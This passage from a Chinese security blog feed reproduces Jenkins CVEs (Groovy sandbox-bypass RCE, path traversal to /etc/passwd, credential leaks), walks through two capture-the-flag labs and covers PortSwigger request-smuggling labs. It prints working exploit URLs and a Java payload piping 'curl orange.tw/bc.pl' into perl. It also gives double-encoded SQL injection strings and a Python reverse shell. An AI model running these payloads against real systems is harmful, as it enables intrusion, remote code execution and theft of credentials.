远程命令执行</h3><p>可以使用如下的一键化脚本</p><pre><code>https://github.com/orangetw/awesome-jenkins-rce-2019</code></pre><p>也可以自定义发送请求</p><pre><code>http://x.x.x.x:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x {public x(){&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;.execute()}}</code></pre><p>页面返回空白，响应为</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145447.png" alt="image-20200325171107715"></p><p>如果使用脚本，则同样效果</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145454.png" alt="image-20200325171239538"></p><p>还可以使用的POC，使用会提示错误信息，但命令已执行。</p><pre><code>/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;)%7d)%0aclass+Person%7b%7d/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;.execute().text+%7d)%0aclass+Person%7b%7d</code></pre><h3 id="CVE-2018-1999002-任意文件读取"><a href="#CVE-2018-1999002-任意文件读取" class="headerlink" title="CVE-2018-1999002 任意文件读取"></a>CVE-2018-1999002 任意文件读取</h3><p>影响版本：Jenkins weekly 2.132 以及更早的版本。Jenkins LTS 2.121.1 以及更早的版本</p><p>可以读取Windows系统服务器中的任意文件，且在特定而条件下也可以读取Linux系统服务器中的文件.</p><p>详情：<code>https://xz.aliyun.com/t/2486</code></p><p>结合payload来看，我们请求的url为<code>/plugin/credentials/.ini</code>，则<code>base</code>为空，扩展名（ext变量）即为<code>.ini</code>，然后通过一系列的尝试openURL，在此例中即最后一个情形<code>con = openURL(map(base+&#39;_&#39;+ locale.getLanguage()+ext));</code>，会去请求<code>_../../../../../../../../../../../../windows/win.ini</code> ，尽管目录<code>_..</code>并不存在，但在win下可以直接通过路径穿越来绕过。但在linux，则需要一个带有<code>_</code>的目录来想办法绕过。</p><p>需要已经开启了匿名用户读取权限，在请求头中添加</p><pre><code>Accept-Language: /../../../../../../../../etc/passwd</code></pre><p>处理请求中的包含路径，比如/plugin/xxxx，可以尝试</p><pre><code>/plugin/jquery-detached/.xml/plugin/jquery-detached/.key/plugin/credentials/.ini</code></pre><p>在Windows下这么使用</p><pre><code>GET /plugin/credentials/.ini HTTP/1.1Host: x.x.x.x:8080Accept: text/javascript, text/html, application/xml, text/xml, */*X-Prototype-Version: 1.7DNT: 1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36Origin: http://x.x.x.x:8080Referer: http://x.x.x.x:8080/Accept-Encoding: gzip, deflateAccept-Language: /../../../../../../../../etc/passwdCookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971Connection: close</code></pre><h3 id="CVE-2018-1000600-Jenkins-GitHub-信息泄露"><a href="#CVE-2018-1000600-Jenkins-GitHub-信息泄露" class="headerlink" title="CVE-2018-1000600 Jenkins GitHub 信息泄露"></a>CVE-2018-1000600 Jenkins GitHub 信息泄露</h3><p>影响版本：Jenkins GitHub插件小于1.29.1</p><p>利用的POC为，其中user1为用户名。</p><pre><code>/securityRealm/user/user1/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://xxx.ceye.io</code></pre><p>执行后显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145502.png" alt="image-20200326173809956"></p><p>查看DNSlog回显</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145507.png" alt="image-20200326173837239"></p><h3 id="CVE-2019-1003000-远程代码执行"><a href="#CVE-2019-1003000-远程代码执行" class="headerlink" title="CVE-2019-1003000 远程代码执行"></a>CVE-2019-1003000 远程代码执行</h3><p>实际影响版本及编号：<strong>CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</strong></p><p>拥有Overall/Read 权限的用户可以绕过沙盒保护，在jenkins可以执行任意代码。此漏洞需要一个账号密码和一个存在的job。受影响插件版本：Pipeline: Declarative 插件 &lt;= 1.3.4。Pipeline: Groovy 插 件 &lt;= 2.61。Script Security 插 件 &lt;= 1.49。</p><p>下载环境和利用代码：<code>https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</code></p><p>执行利用后显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145513.png" alt="image-20200326112837107"></p><p>我们的job中也被添加了如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145517.png" alt="image-20200326112903149"></p><h3 id="CVE-2019-1003005-远程代码执行"><a href="#CVE-2019-1003005-远程代码执行" class="headerlink" title="CVE-2019-1003005 远程代码执行"></a>CVE-2019-1003005 远程代码执行</h3><p>受影响版本：</p><pre><code>Jenkins 2.53Jenkins 2.122Jenkins 2.137Jenkins 2.138 启用匿名读取Jenkins 2.152 启用匿名读取Jenkins 2.153 启用匿名读取Script Security Plugin 1.43Script Security Plugin 1.48</code></pre><p>下载利用脚本：<code>https://github.com/orangetw/awesome-jenkins-rce-2019</code></p><p>构建环境后，执行脚本如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145520.png" alt="image-20200326124130037"></p><p>显示如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145522.png" alt="image-20200326124151396"></p><p>当然如果不想使用这种一键式脚本还可以自己构造jar来利用</p><ol><li>创建Payload.java</li></ol><pre><code>public class Payload {    public Payload(){        try {            String payload = &quot;curl orange.tw/bc.pl | perl -&quot;;            String[] cmds = {&quot;/bin/bash&quot;, &quot;-c&quot;, payload};            java.lang.Runtime.getRuntime().exec(cmds);        } catch (Exception e) { }    }}</code></pre><ol start="2"><li>编译文件，创建META-INF/services/文件夹，同时在文件夹下创建名为org.codehaus.groovy.plugins.Runners的文件。内容随意，比如Payload</li><li>文件创建后，在某一目录下，文件树类似如下：</li></ol><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145524.png" alt="image-20200327093359850"></p><ol start="4"><li>编译以上目录<code>jar cvf poc-1.jar code/</code></li><li>将编译产生的文件移动到类似如下地址<code>cp poc-1.jar ~/www/code/payload/poc/1/</code></li><li>将www目录移动到web服务器中，地址类似：<code>http://xxx.com/code/payload/poc/1.poc-1.jar</code></li><li>利用如下exp</li></ol><pre><code>http://&lt;TARGET HOST&gt;/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=&#39;payload&#39;, root=&#39;http://&lt;EXPLOIT HOST&gt;&#39;)%0a@Grab(group=&#39;package&#39;, module=&#39;payload&#39;, version=&#39;1&#39;)%0aimport Payload;</code></pre><h3 id="CVE-2019-1003029-Script-Security-Plugin沙箱绕过"><a href="#CVE-2019-1003029-Script-Security-Plugin沙箱绕过" class="headerlink" title="CVE-2019-1003029 Script Security Plugin沙箱绕过"></a>CVE-2019-1003029 Script Security Plugin沙箱绕过</h3><p>此漏洞和CVE-2019-1003005漏洞同样都是由Script Security插件引起。利用方式和上一致。影响版本1.55以下。</p><h3 id="CVE-2019-10392-Jenkins-Git-插件命令执行"><a href="#CVE-2019-10392-Jenkins-Git-插件命令执行" class="headerlink" title="CVE-2019-10392 Jenkins Git 插件命令执行"></a>CVE-2019-10392 Jenkins Git 插件命令执行</h3><p>之前做过这个漏洞的复现，地址：<a href="https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19认证远程RCE/" target="_blank" rel="noopener">https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/</a></p><h3 id="CVE-2019-10352-任意文件写入"><a href="#CVE-2019-10352-任意文件写入" class="headerlink" title="CVE-2019-10352 任意文件写入"></a>CVE-2019-10352 任意文件写入</h3><p>该漏洞使经过身份验证的具有Job/Configure权限的攻击者可以使用目标之外的文件名定义文件参数，从而导致任意文件写入。</p><p>创建一个名为test的新“自由式项目”（该项目的工作空间将位于JENKINS_HOME/workspace/test）</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145528.png" alt="image-20200327131927499"></p><p>创建一个受限制的用户，提供总体读取和作业构建，配置和读取权限。在配置中选择文件参数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145529.png" alt="image-20200327132432562"></p><p>单击构建选择上传文件，上传一个1.png</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145532.png" alt="image-20200327132552837"></p><p>开始构建就可以将其写入运行Jenkins的用户有权写入的文件系统上的任何位置。</p><h3 id="CVE-2019-10300-GitLab插件信息泄露漏洞"><a href="#CVE-2019-10300-GitLab插件信息泄露漏洞" class="headerlink" title="CVE-2019-10300 GitLab插件信息泄露漏洞"></a>CVE-2019-10300 GitLab插件信息泄露漏洞</h3><p>Jenkins GitLab插件1.5.11 的功能中存在一个可利用的信息泄露漏洞。来自具有“ Overall/Read”权限的用户（例如，启用了匿名用户）的特制HTTP请求，可能导致该插件的受影响版本将Jenkins凭据数据库中的凭据公开给攻击者控制的服务器。</p><p>需要下载插件：<code>https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/gitlab-plugin/1.5.11/gitlab-plugin.hpi</code></p><p>利用分析：<code>https://talosintelligence.com/vulnerability_reports/TALOS-2019-0788</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。&lt;/p&gt;
&lt;h3 id=&quot;CVE-2015-8103-反序列化远程代码执行&quot;&gt;&lt;a href=&quot;#CVE-2015-8103-反序列化远程代码执行&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>6Days Lab - v1.0.1</title>
    <link href="/2020/03/6Days-Lab-v1-0-1/"/>
    <id>/2020/03/6Days-Lab-v1-0-1/</id>
    <published>2020-03-25T07:35:02.000Z</published>
    <updated>2020-03-25T08:08:56.223Z</updated>
    
    <content type="html"><![CDATA[<p>访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png" alt="image-20200324154403672"></p><p>点击图片查看链接，发现是内网地址，估计是系统没把内网地址进行转换。</p><pre><code>http://10.66.20.100/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg</code></pre><p>不过可以通过此判断大概存在任意文件读取。再查看下面的优惠码，随便输入优惠码返回为空，但是输入单引号等会提示被IPS拦截。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153407.png" alt="image-20200324154610973"></p><p>那么这里也可能有SQL注入。</p><p>先查看上面文件读取是否可以读取到文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153409.png" alt="image-20200324154707368"></p><p>再去读取优惠码页面，里面有个sql语句的拼接。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153411.png" alt="image-20200324154744119"></p><p>再去查看config.php。发现数据库的账号密码</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153414.png" alt="image-20200324154854709"></p><p>再去尝试读取本地系统文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153415.png" alt="image-20200324155044173"></p><p>由于权限原因，是不能直接读取flag文件。尝试查找对应的目录</p><pre><code>/proc/sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid。/proc/pid/cmdline   则可以看到对应pid进程的完整命令行。</code></pre><p>在查找内网端口服务的时候，发现80端口并没有开放，也就是内网端口和外部访问端口不一致，应该是做了端口转发出来。也许可以在内网端口上直接来执行SQL注入绕过IPS。遍历端口后发现8080端口是首页地址。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153417.png" alt="image-20200324172944910"></p><p>测试双编码的情况下，可以绕过IPS，只是比在外部执行可以看到明显的返回。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153420.png" alt="image-20200324173354044"></p><p>查询得知两字段</p><pre><code>aaaa%2527union%2520select%25201,2%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153422.png" alt="image-20200325095033797"></p><p>库名，应该是需要查询<code>fancydb</code></p><pre><code>aaa%2527%2520union%2520select%2520group_concat%2528schema_name%2529%252C2%2520from%2520information_schema.schemata%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153423.png" alt="image-20200325095158899"></p><p>查表名</p><pre><code>aaa%2527%2520union%2520select%2520group_concat%2528table_name%2529%252C2%2520from%2520information_schema.tables%2520where%2520table_schema%253D0x66616e63796462%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153425.png" alt="image-20200325095533778"></p><p>字段名</p><pre><code>aaa%2527%2520union%2520select%2520group_concat%2528column_name%2529%252C2%2520from%2520information_schema.columns%2520where%2520table_name%253D%2527users%2527%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153427.png" alt="image-20200325095658267"></p><p>查询到账号密码<code>andrea:SayNoToPentests</code></p><pre><code>aaaaaa%2527%2520union%2520select%2520group_concat%2528username%252C0x3a%252Cpassword%2529%252C2%2520from%2520users%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153431.png" alt="image-20200325095818906"></p><p>尝试利用sql注入写文件，不过需要先把物理路径找到，尝试默认的apache路径<code>/var/www/html</code>，试过发现路径是如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153433.png" alt="image-20200325100055468"></p><p>尝试导出文件失败，想起来用户非root，且不具备secure_file_priv。后来想找登陆和连接入口的时候感觉这个用户名比较眼熟，才想起来用户在passwd文件中出现过。且之前尝试搜索文件的时候尝试查找了用户下面的历史命令文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153434.png" alt="image-20200325102225242"></p><p>那就直接试试ssh，确实可以登陆但是没有回显</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153437.png" alt="image-20200325102859382"></p><p>尝试反弹shell，发现是个rbash，不能这么反弹shell</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153438.png" alt="image-20200325103330806"></p><p>尝试python反弹</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>获得反弹shell，同时使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，获取原生终端</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153440.png" alt="image-20200325103553741"></p><p>目录下有个suid位文件，不过不能利用，权限不对。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153442.png" alt="image-20200325104928838"></p><p>没有历史命令文件等，不可执行sudo，查找内核漏洞，内核还不算高。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153444.png" alt="image-20200325110140941"></p><p>开启一个外网服务，下载到服务器，发现可以正常编译不报错。。。执行后获得root权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153445.png" alt="image-20200325110747898"></p><p>找到根目录下的flag文件，是一个可执行文件。执行后提示完成</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153447.png" alt="image-20200325110822459"></p><p>回过头再去看那个dog文件是啥，发现还是提示Access Denied。难道这玩意就是寻开心的？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png&quot; alt=&quot;ima
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>BBQ Factory</title>
    <link href="/2020/03/BBQ-Factory/"/>
    <id>/2020/03/BBQ-Factory/</id>
    <published>2020-03-25T07:31:57.000Z</published>
    <updated>2020-03-25T07:31:57.682Z</updated>
    
    <content type="html"><![CDATA[<p>这个并没有做完，卡在了某一点。先做记录<br>打开页面访问</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152809.png" alt="image-20200318173039025"></p><p>看到如下地址</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152814.png" alt="image-20200318173054306"></p><pre><code>http://ctf30.root-me.org//details.php?file=pdf/GROPIMP.pdf</code></pre><p>基本可以断定这是个任意文件读取。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152817.png" alt="image-20200318173231628"></p><p>现在问题是需要去读取什么文件呢。先放置，查看目录，找打一个admin目录。跳转到8080端口</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152821.png" alt="image-20200318173323249"></p><p>暂时没有爆破的欲望，继续查看，本来打算去读取一些密码，但是不知道该读取哪些文件。</p><p>尝试读取access日志，没有发现东西，想查看配置文件，比如phpmyadmin的配置文件，但是没找对目录。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152823.png" alt="image-20200318173433770"></p><p>后来在wamp的日志中找到了error日志，在日志中发现了phpmyadmin的名称。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152825.png" alt="image-20200318173214281"></p><p>phpmyadmin的密码是空密码设置，所以要是可以找到phpmyadmin的登陆地址就可以直接进去。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152827.png" alt="image-20200318173641948"></p><p>不过遗憾的是没使用phpmyadmin。准确的说是没有找到可以访问phpmyadmin的路径。检索wamp的版本</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152828.png" alt="image-20200319094207912"></p><p>现在明显的入手点就是admin页面，查看httpd.conf看看有没有目录地址，查看过后发现只有80端口一个服务。也没有虚拟站点和配置文件导入，意思是8080的端口不是wamp启动的。。。</p><p>不过随便输一个目录，在8080端口下，会报错显示一个exe文件地址。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152830.png" alt="image-20200319143027015"></p><p>下载查看，打开后发现是一个web的启动器，自动在8080端口开放。也许就是系统上8080端口服务的提供器。</p><p>丢到IDA中查看一下，也许有账号密码呢。尝试搜索Login error。找到如下信息</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152832.png" alt="image-20200319145603084"></p><p>这个信息正好是返回的响应，从里面可以看到他需要一个administration账号权限。访问下面显示的连接可以看到</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152835.png" alt="image-20200319145748709"></p><p>账号密码的来源，超上面看admin/amaBBQlova，登陆成功设置cookie：BBQOOQIE=9491b1db2da8d1efa106f013e4576b5a。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152837.png" alt="image-20200319145828589"></p><p>登陆后再去查看admin页面，貌似还需要别的？</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152838.png" alt="image-20200319151329726"></p><p>这个系统就给出了三个地址，<code>/index  /login  /admin</code>，他到底还要啥啊。。</p><p>尝试探测端口，但是稍微加点线程系统就卡住，试了半天，一个常用服务的端口都没找到。在尝试ssh的时候发现好像默认是优先公私钥登陆，所以读取到公私钥也可以访问，但是尝试几个路径都没发现公私钥。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个并没有做完，卡在了某一点。先做记录&lt;br&gt;打开页面访问&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152809.png&quot; alt=&quot;image-
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>HTTP 请求走私</title>
    <link href="/2020/03/HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>/2020/03/HTTP-请求走私/</id>
    <published>2020-03-12T02:29:20.000Z</published>
    <updated>2020-03-12T04:09:36.846Z</updated>
    
    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理有两篇文章写的十分详细，此处不在过多陈述。</p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>登陆访问即可，看到实验室说明，只需要后端收到GPOST的请求方法即可。</p><p><img src="/images/2020/03/12/8145cce0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200311170411457.png"></p><p>通过要求可以得知这是一个前端CL，后端TE的方式。先关闭burp的自动更新content-length的设置，然后修改为6字节，先发送一个请求，这个请求先不需要管。</p><p><img src="/images/2020/03/12/89e63470-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200311170700419.png"></p><p>再发送一个POST请求，就会显示这次实验的需求，GPOST方法。</p><p><img src="/images/2020/03/12/8e8007e0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200311170830800.png"></p><pre><code>前端发送数据的时候，实验content-length来设置请求的长度，后端使用transfer-encoding来处理消息。在cl和te的模式中。默认是优先使用te。前端认为POST / HTTP/1.1Content-Length: 6Transfer-Encodin: chunkedxxxxxx0G以上为一个请求,参数长度受content-length控制。而后端接收te的模式，默认这个是一个分块请求POST / HTTP/1.1Content-Length: 6Transfer-Encodin: chunkedxxxxxx0-------------------------到此，后端认为是一个请求，而G作为下一个请求而等待G这时候再进来的请求，就会作为继续未完成的请求而连接GPOST / HTTP/1.1</code></pre><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>访问实验室，查看需求，由于说明中已经告诉我们是一个te-cl的方式。</p><p><img src="/images/2020/03/12/936b7dc0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312091318601.png"></p><p>构造transfer-encoding块，其中12代表0之前的字符串长度包括换行符，长度为16，十六进制就是12。最后面的0需要跟两个换行符，缺少的话会提示Invalid request。可能构造成功后，发送几次仍然显示Missing parameter，多试几次即可。</p><p><img src="/images/2020/03/12/97473150-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312095612846.png"></p><pre><code>前端服务器使用TE块来区分。参数中12GPOST / HTTP/1.10都被认为是一个合法的块消息。而后端服务器处理中只使用CL来划分消息。导致在请求中的content-length: 4让后端服务器认为：12--------------------消息到此为一个消息GPOST / HTTP/1.10--------------------第二个请求消息从而达到请求走私的目的</code></pre><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>此种方式是前后端服务器都支持并且默认使用te块，使用某种方式导致一端不识别te块来达到，cl-te或者te-cl的方式。</p><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p>同样是用后端服务器识别到GPOST请求方法。</p><p><img src="/images/2020/03/12/9c08ff20-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312101007186.png"></p><p>构造混淆的te头的常用方式：</p><pre><code>1. Transfer-Encoding: xchunked2. Transfer-Encoding : chunked3. Transfer-Encoding: chunked   Transfer-Encoding: x4. Transfer-Encoding:[tab]chunked5. [space]Transfer-Encoding: chunked6. X: X[\n]Transfer-Encoding: chunked7. Transfer-Encoding   : chunked</code></pre><p>请求了多次后发现，一直提示缺少参数。</p><p><img src="/images/2020/03/12/a12f8230-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312102005572.png"></p><p>构造错误的te块，提示无效请求，说明前端服务器很可能是te。</p><p><img src="/images/2020/03/12/a589dba0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312102105557.png"></p><p>重新使用以上提到的方式来尝试混淆te，尝试了几种方式，发现只有双写的情况下，可以混淆后端对te的处理。</p><p><img src="/images/2020/03/12/aa4bd080-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312102617950.png"></p><p>也就是说前端服务器处理te块消息使用了第一个te头来当作标准解析，而后端服务器中使用了第二个te头来当作标准解析。</p><h3 id="请求走私利用"><a href="#请求走私利用" class="headerlink" title="请求走私利用"></a>请求走私利用</h3><p>上面几种情况说明了请求走私的利用方式，现在同样利用实验室来尝试一下请求走私能获取到什么。</p><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p><h4 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>利用CL-TE漏洞方式，来访问前端服务器不能访问的/admin页面。同时删除carlos用户。</p><p><img src="/images/2020/03/12/1f1b2700-6417-11ea-8626-838e679dac65.png" alt="image20200312103959649.png"></p><p>尝试直接访问的时候提示页面不能访问，然后修改为cl-te的方式</p><p><img src="/images/2020/03/12/25645820-6417-11ea-8626-838e679dac65.png" alt="image20200312104623997.png"></p><p>多发送两次会发现提示</p><p><img src="/images/2020/03/12/2881ebd0-6417-11ea-8626-838e679dac65.png" alt="image20200312105204438.png"></p><p>添加localhost头。多发送几次就可以看到需要删除的用户。</p><p><img src="/images/2020/03/12/2be9f600-6417-11ea-8626-838e679dac65.png" alt="image20200312105326207.png"></p><p>构造删除的地址来发送，提示跳转302</p><p><img src="/images/2020/03/12/304a9100-6417-11ea-8626-838e679dac65.png" alt="image20200312105432606.png"></p><p>再次查看页面发送用户被删除</p><p><img src="/images/2020/03/12/34349c70-6417-11ea-8626-838e679dac65.png" alt="image20200312105610334.png"></p><h4 id="TE-TE-1"><a href="#TE-TE-1" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>第二个是利用TE-CL的方式来删除用户，同样尝试一下</p><p>实验室: <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p><p><img src="/images/2020/03/12/39cfda50-6417-11ea-8626-838e679dac65.png" alt="image20200312105739571.png"></p><p>流程基本一致，还是需要添加localhost头</p><p><img src="/images/2020/03/12/3d1fc8a0-6417-11ea-8626-838e679dac65.png" alt="image20200312110053887.png"></p><p>查看到admin页面</p><p><img src="/images/2020/03/12/4176edc0-6417-11ea-8626-838e679dac65.png" alt="image20200312110217775.png"></p><p>执行删除用户，查看已删除。</p><p><img src="/images/2020/03/12/46effda0-6417-11ea-8626-838e679dac65.png" alt="image20200312110345830.png"></p><h4 id="请求走私重写请求"><a href="#请求走私重写请求" class="headerlink" title="请求走私重写请求"></a>请求走私重写请求</h4><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p><p>利用请求走私来达到访问/admin页面，但是需要添加请求头，类似xff头，但不是xff头，然后再去删除用户。</p><p><img src="/images/2020/03/12/5891cdf0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312111010862.png"></p><p>实验室有个搜索功能，说明这个功能可能帮助我们获得需要的请求头。先访问admin页面</p><p><img src="/images/2020/03/12/60894b50-6416-11ea-ac1a-19f07685b6f0.png" 